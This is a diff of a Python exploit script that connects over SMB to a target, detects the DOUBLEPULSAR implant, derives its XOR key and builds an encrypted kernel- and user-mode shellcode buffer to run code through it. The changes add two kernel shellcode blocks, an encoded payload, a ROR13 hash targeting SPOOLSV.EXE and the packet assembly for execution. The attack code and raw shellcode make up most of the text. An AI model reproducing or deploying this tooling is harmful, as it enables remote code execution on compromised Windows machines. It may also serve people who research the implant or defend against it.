@@ -24,84 +24,110 @@ def hexdump(src, length=16, sep='.'):
         lines.append('{0:08x}  {1:{2}s} |{3:{4}s}|'.format(c, hex_, length * 3, printable, length))
     return lines
 
-kernel_shellcode = b"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
-kernel_shellcode += b"\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
-kernel_shellcode += b"\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8\x65\x48\x89\x24\x25\x10"
-kernel_shellcode += b"\x00\x00\x00\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x50\x53\x51\x52"
-kernel_shellcode += b"\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41"
-kernel_shellcode += b"\x56\x41\x57\x6A\x2B\x65\xFF\x34\x25\x10\x00\x00\x00\x41\x53\x6A"
-kernel_shellcode += b"\x33\x51\x4C\x89\xD1\x48\x83\xEC\x08\x55\x48\x81\xEC\x58\x01\x00"
-kernel_shellcode += b"\x00\x48\x8D\xAC\x24\x80\x00\x00\x00\x48\x89\x9D\xC0\x00\x00\x00"
-kernel_shellcode += b"\x48\x89\xBD\xC8\x00\x00\x00\x48\x89\xB5\xD0\x00\x00\x00\x48\xA1"
-kernel_shellcode += b"\xF8\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x48\x89\xC2\x48\xC1\xEA\x20\x48"
-kernel_shellcode += b"\x31\xDB\xFF\xCB\x48\x21\xD8\xB9\x82\x00\x00\xC0\x0F\x30\xFB\xE8"
-kernel_shellcode += b"\x38\x00\x00\x00\xFA\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x48\x83"
-kernel_shellcode += b"\xEC\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59"
-kernel_shellcode += b"\x41\x58\x5D\x5F\x5E\x5A\x59\x5B\x58\x65\x48\x8B\x24\x25\x10\x00"
-kernel_shellcode += b"\x00\x00\x0F\x01\xF8\xFF\x24\x25\xF8\x0F\xD0\xFF\x56\x41\x57\x41"
-kernel_shellcode += b"\x56\x41\x55\x41\x54\x53\x55\x48\x89\xE5\x66\x83\xE4\xF0\x48\x83"
-kernel_shellcode += b"\xEC\x20\x4C\x8D\x35\xE3\xFF\xFF\xFF\x65\x4C\x8B\x3C\x25\x38\x00"
-kernel_shellcode += b"\x00\x00\x4D\x8B\x7F\x04\x49\xC1\xEF\x0C\x49\xC1\xE7\x0C\x49\x81"
-kernel_shellcode += b"\xEF\x00\x10\x00\x00\x49\x8B\x37\x66\x81\xFE\x4D\x5A\x75\xEF\x41"
-kernel_shellcode += b"\xBB\x5C\x72\x11\x62\xE8\x18\x02\x00\x00\x48\x89\xC6\x48\x81\xC6"
-kernel_shellcode += b"\x08\x03\x00\x00\x41\xBB\x7A\xBA\xA3\x30\xE8\x03\x02\x00\x00\x48"
-kernel_shellcode += b"\x89\xF1\x48\x39\xF0\x77\x11\x48\x8D\x90\x00\x05\x00\x00\x48\x39"
-kernel_shellcode += b"\xF2\x72\x05\x48\x29\xC6\xEB\x08\x48\x8B\x36\x48\x39\xCE\x75\xE2"
-kernel_shellcode += b"\x49\x89\xF4\x31\xDB\x89\xD9\x83\xC1\x04\x81\xF9\x00\x00\x01\x00"
-kernel_shellcode += b"\x0F\x8D\x66\x01\x00\x00\x4C\x89\xF2\x89\xCB\x41\xBB\x66\x55\xA2"
-kernel_shellcode += b"\x4B\xE8\xBC\x01\x00\x00\x85\xC0\x75\xDB\x49\x8B\x0E\x41\xBB\xA3"
-kernel_shellcode += b"\x6F\x72\x2D\xE8\xAA\x01\x00\x00\x48\x89\xC6\xE8\x50\x01\x00\x00"
-kernel_shellcode += b"\x41\x81\xF9\xBF\x77\x1F\xDD\x75\xBC\x49\x8B\x1E\x4D\x8D\x6E\x10"
-kernel_shellcode += b"\x4C\x89\xEA\x48\x89\xD9\x41\xBB\xE5\x24\x11\xDC\xE8\x81\x01\x00"
-kernel_shellcode += b"\x00\x6A\x40\x68\x00\x10\x00\x00\x4D\x8D\x4E\x08\x49\xC7\x01\x00"
-kernel_shellcode += b"\x10\x00\x00\x4D\x31\xC0\x4C\x89\xF2\x31\xC9\x48\x89\x0A\x48\xF7"
-kernel_shellcode += b"\xD1\x41\xBB\x4B\xCA\x0A\xEE\x48\x83\xEC\x20\xE8\x52\x01\x00\x00"
-kernel_shellcode += b"\x85\xC0\x0F\x85\xC8\x00\x00\x00\x49\x8B\x3E\x48\x8D\x35\xE9\x00"
-kernel_shellcode += b"\x00\x00\x31\xC9\x66\x03\x0D\xD7\x01\x00\x00\x66\x81\xC1\xF9\x00"
-kernel_shellcode += b"\xF3\xA4\x48\x89\xDE\x48\x81\xC6\x08\x03\x00\x00\x48\x89\xF1\x48"
-kernel_shellcode += b"\x8B\x11\x4C\x29\xE2\x51\x52\x48\x89\xD1\x48\x83\xEC\x20\x41\xBB"
-kernel_shellcode += b"\x26\x40\x36\x9D\xE8\x09\x01\x00\x00\x48\x83\xC4\x20\x5A\x59\x48"
-kernel_shellcode += b"\x85\xC0\x74\x18\x48\x8B\x80\xC8\x02\x00\x00\x48\x85\xC0\x74\x0C"
-kernel_shellcode += b"\x48\x83\xC2\x4C\x8B\x02\x0F\xBA\xE0\x05\x72\x05\x48\x8B\x09\xEB"
-kernel_shellcode += b"\xBE\x48\x83\xEA\x4C\x49\x89\xD4\x31\xD2\x80\xC2\x90\x31\xC9\x41"
-kernel_shellcode += b"\xBB\x26\xAC\x50\x91\xE8\xC8\x00\x00\x00\x48\x89\xC1\x4C\x8D\x89"
-kernel_shellcode += b"\x80\x00\x00\x00\x41\xC6\x01\xC3\x4C\x89\xE2\x49\x89\xC4\x4D\x31"
-kernel_shellcode += b"\xC0\x41\x50\x6A\x01\x49\x8B\x06\x50\x41\x50\x48\x83\xEC\x20\x41"
-kernel_shellcode += b"\xBB\xAC\xCE\x55\x4B\xE8\x98\x00\x00\x00\x31\xD2\x52\x52\x41\x58"
-kernel_shellcode += b"\x41\x59\x4C\x89\xE1\x41\xBB\x18\x38\x09\x9E\xE8\x82\x00\x00\x00"
-kernel_shellcode += b"\x4C\x89\xE9\x41\xBB\x22\xB7\xB3\x7D\xE8\x74\x00\x00\x00\x48\x89"
-kernel_shellcode += b"\xD9\x41\xBB\x0D\xE2\x4D\x85\xE8\x66\x00\x00\x00\x48\x89\xEC\x5D"
-kernel_shellcode += b"\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5E\xC3\xE9\xB5\x00\x00\x00"
-kernel_shellcode += b"\x4D\x31\xC9\x31\xC0\xAC\x41\xC1\xC9\x0D\x3C\x61\x7C\x02\x2C\x20"
-kernel_shellcode += b"\x41\x01\xC1\x38\xE0\x75\xEC\xC3\x31\xD2\x65\x48\x8B\x52\x60\x48"
-kernel_shellcode += b"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x12\x48\x8B\x72\x50\x48\x0F"
-kernel_shellcode += b"\xB7\x4A\x4A\x45\x31\xC9\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41"
-kernel_shellcode += b"\xC1\xC9\x0D\x41\x01\xC1\xE2\xEE\x45\x39\xD9\x75\xDA\x4C\x8B\x7A"
-kernel_shellcode += b"\x20\xC3\x4C\x89\xF8\x41\x51\x41\x50\x52\x51\x56\x48\x89\xC2\x8B"
-kernel_shellcode += b"\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x01\xD0\x50\x8B"
-kernel_shellcode += b"\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\x48\xFF\xC9\x41\x8B\x34\x88"
-kernel_shellcode += b"\x48\x01\xD6\xE8\x78\xFF\xFF\xFF\x45\x39\xD9\x75\xEC\x58\x44\x8B"
-kernel_shellcode += b"\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01"
-kernel_shellcode += b"\xD0\x41\x8B\x04\x88\x48\x01\xD0\x5E\x59\x5A\x41\x58\x41\x59\x41"
-kernel_shellcode += b"\x5B\x41\x53\xFF\xE0\x56\x41\x57\x55\x48\x89\xE5\x48\x83\xEC\x20"
-kernel_shellcode += b"\x41\xBB\xDA\x16\xAF\x92\xE8\x4D\xFF\xFF\xFF\x31\xC9\x51\x51\x51"
-kernel_shellcode += b"\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00\x5A\x48\x83\xEC\x20\x41"
-kernel_shellcode += b"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
-kernel_shellcode += b"\x5E\xC3"
+
+shellcode = b""
+shellcode += b"\x31\xc9\x41\xe2\x01\xc3\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53"
+shellcode += b"\x55\x48\x89\xe5\x66\x83\xe4\xf0\x48\x83\xec\x20\x4c\x8d\x35\xe3"
+shellcode += b"\xff\xff\xff\x65\x4c\x8b\x3c\x25\x38\x00\x00\x00\x4d\x8b\x7f\x04"
+shellcode += b"\x49\xc1\xef\x0c\x49\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x49"
+shellcode += b"\x8b\x37\x66\x81\xfe\x4d\x5a\x75\xef\x41\xbb\x5c\x72\x11\x62\xe8"
+shellcode += b"\x18\x02\x00\x00\x48\x89\xc6\x48\x81\xc6\x08\x03\x00\x00\x41\xbb"
+shellcode += b"\x7a\xba\xa3\x30\xe8\x03\x02\x00\x00\x48\x89\xf1\x48\x39\xf0\x77"
+shellcode += b"\x11\x48\x8d\x90\x00\x05\x00\x00\x48\x39\xf2\x72\x05\x48\x29\xc6"
+shellcode += b"\xeb\x08\x48\x8b\x36\x48\x39\xce\x75\xe2\x49\x89\xf4\x31\xdb\x89"
+shellcode += b"\xd9\x83\xc1\x04\x81\xf9\x00\x00\x01\x00\x0f\x8d\x66\x01\x00\x00"
+shellcode += b"\x4c\x89\xf2\x89\xcb\x41\xbb\x66\x55\xa2\x4b\xe8\xbc\x01\x00\x00"
+shellcode += b"\x85\xc0\x75\xdb\x49\x8b\x0e\x41\xbb\xa3\x6f\x72\x2d\xe8\xaa\x01"
+shellcode += b"\x00\x00\x48\x89\xc6\xe8\x50\x01\x00\x00\x41\x81\xf9";
+
+shellcode_part_two = b""
+shellcode_part_two += b"\x75\xbc\x49\x8b\x1e\x4d\x8d\x6e\x10\x4c\x89\xea\x48\x89\xd9"
+shellcode_part_two += b"\x41\xbb\xe5\x24\x11\xdc\xe8\x81\x01\x00\x00\x6a\x40\x68\x00\x10"
+shellcode_part_two += b"\x00\x00\x4d\x8d\x4e\x08\x49\xc7\x01\x00\x10\x00\x00\x4d\x31\xc0"
+shellcode_part_two += b"\x4c\x89\xf2\x31\xc9\x48\x89\x0a\x48\xf7\xd1\x41\xbb\x4b\xca\x0a"
+shellcode_part_two += b"\xee\x48\x83\xec\x20\xe8\x52\x01\x00\x00\x85\xc0\x0f\x85\xc8\x00"
+shellcode_part_two += b"\x00\x00\x49\x8b\x3e\x48\x8d\x35\xe9\x00\x00\x00\x31\xc9\x66\x03"
+shellcode_part_two += b"\x0d\xd7\x01\x00\x00\x66\x81\xc1\xf9\x00\xf3\xa4\x48\x89\xde\x48"
+shellcode_part_two += b"\x81\xc6\x08\x03\x00\x00\x48\x89\xf1\x48\x8b\x11\x4c\x29\xe2\x51"
+shellcode_part_two += b"\x52\x48\x89\xd1\x48\x83\xec\x20\x41\xbb\x26\x40\x36\x9d\xe8\x09"
+shellcode_part_two += b"\x01\x00\x00\x48\x83\xc4\x20\x5a\x59\x48\x85\xc0\x74\x18\x48\x8b"
+shellcode_part_two += b"\x80\xc8\x02\x00\x00\x48\x85\xc0\x74\x0c\x48\x83\xc2\x4c\x8b\x02"
+shellcode_part_two += b"\x0f\xba\xe0\x05\x72\x05\x48\x8b\x09\xeb\xbe\x48\x83\xea\x4c\x49"
+shellcode_part_two += b"\x89\xd4\x31\xd2\x80\xc2\x90\x31\xc9\x41\xbb\x26\xac\x50\x91\xe8"
+shellcode_part_two += b"\xc8\x00\x00\x00\x48\x89\xc1\x4c\x8d\x89\x80\x00\x00\x00\x41\xc6"
+shellcode_part_two += b"\x01\xc3\x4c\x89\xe2\x49\x89\xc4\x4d\x31\xc0\x41\x50\x6a\x01\x49"
+shellcode_part_two += b"\x8b\x06\x50\x41\x50\x48\x83\xec\x20\x41\xbb\xac\xce\x55\x4b\xe8"
+shellcode_part_two += b"\x98\x00\x00\x00\x31\xd2\x52\x52\x41\x58\x41\x59\x4c\x89\xe1\x41"
+shellcode_part_two += b"\xbb\x18\x38\x09\x9e\xe8\x82\x00\x00\x00\x4c\x89\xe9\x41\xbb\x22"
+shellcode_part_two += b"\xb7\xb3\x7d\xe8\x74\x00\x00\x00\x48\x89\xd9\x41\xbb\x0d\xe2\x4d"
+shellcode_part_two += b"\x85\xe8\x66\x00\x00\x00\x48\x89\xec\x5d\x5b\x41\x5c\x41\x5d\x41"
+shellcode_part_two += b"\x5e\x41\x5f\x5e\xc3\xe9\xb5\x00\x00\x00\x4d\x31\xc9\x31\xc0\xac"
+shellcode_part_two += b"\x41\xc1\xc9\x0d\x3c\x61\x7c\x02\x2c\x20\x41\x01\xc1\x38\xe0\x75"
+shellcode_part_two += b"\xec\xc3\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
+shellcode_part_two += b"\x20\x48\x8b\x12\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x45\x31\xc9"
+shellcode_part_two += b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1"
+shellcode_part_two += b"\xe2\xee\x45\x39\xd9\x75\xda\x4c\x8b\x7a\x20\xc3\x4c\x89\xf8\x41"
+shellcode_part_two += b"\x51\x41\x50\x52\x51\x56\x48\x89\xc2\x8b\x42\x3c\x48\x01\xd0\x8b"
+shellcode_part_two += b"\x80\x88\x00\x00\x00\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
+shellcode_part_two += b"\x49\x01\xd0\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\xe8\x78\xff"
+shellcode_part_two += b"\xff\xff\x45\x39\xd9\x75\xec\x58\x44\x8b\x40\x24\x49\x01\xd0\x66"
+shellcode_part_two += b"\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
+shellcode_part_two += b"\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5b\x41\x53\xff\xe0\x56"
+shellcode_part_two += b"\x41\x57\x55\x48\x89\xe5\x48\x83\xec\x20\x41\xbb\xda\x16\xaf\x92"
+shellcode_part_two += b"\xe8\x4d\xff\xff\xff\x31\xc9\x51\x51\x51\x51\x41\x59\x4c\x8d\x05"
+shellcode_part_two += b"\x1a\x00\x00\x00\x5a\x48\x83\xec\x20\x41\xbb\x46\x45\x1b\x22\xe8"
+shellcode_part_two += b"\x68\xff\xff\xff\x48\x89\xec\x5d\x41\x5f\x5e\xc3"
 
 # pop calculator shellcode - this is a sample.  Change according to your payload
-payload_shellcode = b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
-payload_shellcode += b"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
-payload_shellcode += b"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
-payload_shellcode += b"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
-payload_shellcode += b"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
-payload_shellcode += b"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
-payload_shellcode += b"\x48\x83\xec\x20\x41\xff\xd6"
+payload_shellcode = b""
+payload_shellcode += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d"
+payload_shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\x21\xb7\xcf\x1b\x7c"
+payload_shellcode += b"\xbb\xab\xac\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
+payload_shellcode += b"\xff\xe2\xf4\xdd\xff\x4c\xff\x8c\x53\x6b\xac\x21"
+payload_shellcode += b"\xb7\x8e\x4a\x3d\xeb\xf9\xfd\x77\xff\xfe\xc9\x19"
+payload_shellcode += b"\xf3\x20\xfe\x41\xff\x44\x49\x64\xf3\x20\xfe\x01"
+payload_shellcode += b"\xff\x44\x69\x2c\xf3\xa4\x1b\x6b\xfd\x82\x2a\xb5"
+payload_shellcode += b"\xf3\x9a\x6c\x8d\x8b\xae\x67\x7e\x97\x8b\xed\xe0"
+payload_shellcode += b"\x7e\xc2\x5a\x7d\x7a\x49\x41\x73\xf6\x9e\x53\xf7"
+payload_shellcode += b"\xe9\x8b\x27\x63\x8b\x87\x1a\xac\x30\x2b\x24\x21"
+payload_shellcode += b"\xb7\xcf\x53\xf9\x7b\xdf\xcb\x69\xb6\x1f\x4b\xf7"
+payload_shellcode += b"\xf3\xb3\xe8\xaa\xf7\xef\x52\x7d\x6b\x48\xfa\x69"
+payload_shellcode += b"\x48\x06\x5a\xf7\x8f\x23\xe4\x20\x61\x82\x2a\xb5"
+payload_shellcode += b"\xf3\x9a\x6c\x8d\xf6\x0e\xd2\x71\xfa\xaa\x6d\x19"
+payload_shellcode += b"\x57\xba\xea\x30\xb8\xe7\x88\x29\xf2\xf6\xca\x09"
+payload_shellcode += b"\x63\xf3\xe8\xaa\xf7\xeb\x52\x7d\x6b\xcd\xed\xaa"
+payload_shellcode += b"\xbb\x87\x5f\xf7\xfb\xb7\xe5\x20\x67\x8e\x90\x78"
+payload_shellcode += b"\x33\xe3\xad\xf1\xf6\x97\x5a\x24\xe5\xf2\xf6\x60"
+payload_shellcode += b"\xef\x8e\x42\x3d\xe1\xe3\x2f\xcd\x97\x8e\x49\x83"
+payload_shellcode += b"\x5b\xf3\xed\x78\xed\x87\x90\x6e\x52\xfc\x53\xde"
+payload_shellcode += b"\x48\x92\x53\xc6\xba\xab\xac\x21\xb7\xcf\x1b\x7c"
+payload_shellcode += b"\xf3\x26\x21\x20\xb6\xcf\x1b\x3d\x01\x9a\x27\x4e"
+payload_shellcode += b"\x30\x30\xce\xc7\x4b\x1e\x0e\x77\xf6\x75\xbd\xe9"
+payload_shellcode += b"\x06\x36\x53\xf4\xff\x4c\xdf\x54\x87\xad\xd0\x2b"
+payload_shellcode += b"\x37\x34\xfb\x09\xbe\x10\xeb\x32\xc5\xa0\x71\x7c"
+payload_shellcode += b"\xe2\xea\x25\xfb\x48\x1a\x75\x13\xcf\xce\xdc\x40"
+payload_shellcode += b"\xd3\xe1\x7e\x04\xde\xab\xac"
+
+def ror(dword, bits):
+    """Rotate right (ROR) operation for 32-bit integers."""
+    return ((dword >> bits) | (dword << (32 - bits))) & 0xFFFFFFFF
+
+def generate_process_hash(process):
+    """Generate a process hash based on the given process name."""
+    proc_hash = 0
+    proc = process + '\0'  # Null-terminated string
+
+    for char in proc:
+        proc_hash = ror(proc_hash, 13)
+        proc_hash = (proc_hash + ord(char)) & 0xFFFFFFFF
+
+    return proc_hash
 
 def calculate_doublepulsar_xor_key(s):
     x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
     x = x & 0xffffffff  # this line was added just to truncate to 32 bits
     return x
+
 
 # The arch is adjacent to the XOR key in the SMB signature
 def calculate_doublepulsar_arch(s):
@@ -109,6 +135,7 @@ def calculate_doublepulsar_arch(s):
         return "x86 (32-bit)"
     else:
         return "x64 (64-bit)"
+
 
 def byte_xor(data, key):
     key_bytes = key.to_bytes(4, byteorder='little')
@@ -120,7 +147,7 @@ def byte_xor(data, key):
     '''
     return bytearray(data[i] ^ key_bytes[i % key_length] for i in range(len(data)))
 
-#https://github.com/bjornedstrom/elliptic-curve-chemistry-set/blob/master/eddsa.py
+# https://github.com/bjornedstrom/elliptic-curve-chemistry-set/blob/master/eddsa.py
 def le2int(buf):
     """little endian buffer to integer."""
     integer = 0
@@ -129,6 +156,7 @@ def le2int(buf):
         integer |= ord(byte) << shift
         shift += 8
     return integer
+
 
 def int2le(integer, pad):
     """integer to little endian buffer."""
@@ -144,7 +172,8 @@ def int2le(integer, pad):
         return '\x00'
     return ''.join(buf)
 
-#converted with chatgpt
+
+# converted with chatgpt
 def int_to_le(data: int) -> bytes:
     b = bytearray(4)
     b[0] = data & 0xFF
@@ -152,6 +181,8 @@ def int_to_le(data: int) -> bytes:
     b[2] = (data >> 16) & 0xFF
     b[3] = (data >> 24) & 0xFF
     return bytes(b)
+
+
 '''
 # Test the function
 data = 0x12345678
@@ -163,14 +194,18 @@ print("Bytes: ", " ".join(f"{byte:02X}" for byte in result))
 if __name__ == "__main__":
 
     # Packets
-    negotiate_protocol_request = binascii.unhexlify("00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
-    session_setup_request = binascii.unhexlify("00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
-    tree_connect_request = binascii.unhexlify("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
-    trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
+    negotiate_protocol_request = binascii.unhexlify(
+        "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
+    session_setup_request = binascii.unhexlify(
+        "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
+    tree_connect_request = binascii.unhexlify(
+        "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
+    trans2_session_setup = binascii.unhexlify(
+        "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
 
     timeout = 5.0
     # sample IP
-    ip = "192.168.0.8"
+    ip = "192.168.0.70"
 
     # Connect to socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -224,47 +259,60 @@ if __name__ == "__main__":
         signature = final_response[18:22]
         signature_long = struct.unpack('<I', signature)[0]
         key = calculate_doublepulsar_xor_key(signature_long)
-        
-        #arch_signature = final_response[18:26]
-        #arch_signature_long = struct.unpack('<Q', arch_signature)[0]
-        #arch = calculate_doublepulsar_arch(arch_signature_long)
-        
-        arch_signature = final_response[22:26]
-        arch_signature_long = struct.unpack('<I', arch_signature)[0]
+
+        arch_signature = final_response[18:26]
+        arch_signature_long = struct.unpack('<Q', arch_signature)[0]
         arch = calculate_doublepulsar_arch(arch_signature_long)
-        
+
         print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
-        
-        xor_key = key
-        packed_xor_key = struct.pack('<I', xor_key)
 
-        #print(hexdump(packed_xor_key))
-        #int_bytes_xor_key = int(key)
-        #bytes_xor_key = int2le(int_bytes_xor_key, 0)
-        #b_bytes_xor_key = bytes(bytes_xor_key.encode())
-        #print(hexdump(b_bytes_xor_key))
-        #print(hexdump(packed_xor_key))
-        #print(packed_xor_key)
+        proc_name = "SPOOLSV.EXE"
+        proc_hash = generate_process_hash(proc_name)
+        print(f"Process Hash for {proc_name}: 0x{proc_hash:08X}")
 
-        #generate the final payload shellcode first
-        modified_kernel_shellcode = bytearray(kernel_shellcode)
-        bytes_payload_shellcode = bytearray(payload_shellcode)
+        hMem = bytearray(4096)
+        shellcode_one_part_len = len(shellcode)
+        shellcode_part_two_len = len(shellcode_part_two)
+        ring3_len = len(payload_shellcode)
+        kernel_shellcode_size = shellcode_one_part_len + shellcode_part_two_len + 4
+
+        # Fill memory with 0x90 (NOP equivalent)
+        hMem[:4096] = bytes([0x90] * 4096)
+        proc_hash_bytes = proc_hash.to_bytes(4, byteorder='little')
+
+        hMem[:shellcode_one_part_len] = shellcode
+        hMem[shellcode_one_part_len:shellcode_one_part_len + 4] = proc_hash_bytes
+        hMem[shellcode_one_part_len + 4:shellcode_one_part_len + 4 + shellcode_part_two_len] = shellcode_part_two
+
+        ring3_len_bytes = ring3_len.to_bytes(2, byteorder='little')
+        hMem[kernel_shellcode_size:kernel_shellcode_size + 2] = ring3_len_bytes
+        hMem[kernel_shellcode_size + 2:kernel_shellcode_size + 2 + ring3_len] = payload_shellcode
+
+        # generate the final payload shellcode first
+        modified_kernel_shellcode = bytearray(hMem)
+        # bytes_payload_shellcode = bytearray(buf)
 
         # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
-        payload_shellcode_size = len(payload_shellcode)
+        # payload_shellcode_size = kernel_shellcode_size #len(bytes_payload_shellcode)
+
+        # payload_shellcode_size_in_hex = struct.pack('<H', kernel_shellcode_size)
+        # modified_kernel_shellcode += payload_shellcode_size_in_hex
+        # modified_kernel_shellcode += bytes_payload_shellcode
+
+
+        # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
+        payload_shellcode_size = len(modified_kernel_shellcode)
 
         payload_shellcode_size_in_hex = struct.pack('<H', payload_shellcode_size)
-        modified_kernel_shellcode += payload_shellcode_size_in_hex
-        modified_kernel_shellcode += bytes_payload_shellcode
-        
+
         shellcode_payload_size = len(modified_kernel_shellcode)
         print("Total size of shellcode:  %d" % shellcode_payload_size)
 
-        #padding to 4096 bytes confirmed to work
-        #you must pad the buffer to 4096 bytes
+        # commenting out the padding to 4096 bytes until this can be confirmed to work
+        # not a good idea to use NOPS either
+
         print("Total size of shellcode before padding:  %d" % shellcode_payload_size)
         padded_bytes = 4096 - shellcode_payload_size
-        max_shellcode_size = 4096
 
         bytes_filler_bytes = bytearray()
         bytes_filler_bytes += b'\x90' * padded_bytes
@@ -272,42 +320,45 @@ if __name__ == "__main__":
         buffer_len = len(modified_kernel_shellcode)
         print("Total size of shellcode after padding:  %d" % buffer_len)
 
-        
-        #xor the payload data now
+
+        # xor the payload data now
         print("encrypting the shellcode with the XOR key")
-        xor_data = byte_xor(modified_kernel_shellcode, key)
-        
-        #build the doublepulsar parameters
+        xor_bytes = byte_xor(modified_kernel_shellcode, key)
+
+        # build the doublepulsar parameters
         EntireShellcodeSize = len(modified_kernel_shellcode)
         print("Generating the parameters...")
-        parameters = b''
+        parameters = bytearray()
         '''
         since our payload is less than 4096, we can send the packet in one packet.
         it is possible for the EntireSize to be 5 MB in bytes
         it is not possible for the chunksize to be more than 4096
         if this is a large payload, you must increment the offset by the last chunk size
         '''
-        EntireSize = struct.pack('<I', max_shellcode_size) #entire value of the payload being uploaded
-        ChunkSize = struct.pack('<I', max_shellcode_size) #using the same value since chunk size is less than 4096 
-        PayloadOffset = struct.pack('<I', 0) #No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
+        EntireSize = struct.pack('<I', buffer_len)  # entire value of the payload being uploaded
+        ChunkSize = struct.pack('<I', buffer_len)  # using the same value since chunk size is less than 4096
+        offset = struct.pack('<I',
+                             0)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
         parameters += EntireSize
         parameters += ChunkSize
-        parameters += PayloadOffset
+        parameters += offset
         parameters_bytearray = bytearray(parameters)
         xor_parameters = byte_xor(parameters_bytearray, key)
-        
-        #build the execution packet
-        trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
+
+        # build the execution packet
+        trans2_exec_packet = binascii.unhexlify(
+            "0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
         doublepulsar_exec_packet = bytearray(trans2_exec_packet)
-        
+
         trans2_packet_len = len(doublepulsar_exec_packet)
